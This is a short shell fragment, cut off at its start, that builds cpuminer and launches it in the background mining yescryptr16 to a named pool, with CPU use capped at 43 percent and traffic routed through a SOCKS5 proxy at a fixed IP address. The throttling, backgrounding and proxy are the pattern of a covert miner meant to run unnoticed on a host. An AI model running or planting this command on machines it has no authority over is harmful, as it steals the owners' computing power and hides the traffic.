...
./build.sh
make
cpulimit --exe cpuminer --limit 43 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://cryply.luckypool.org:9999 -u manlytq.180327 -p x -x socks5://108.61.229.6:6651 --background
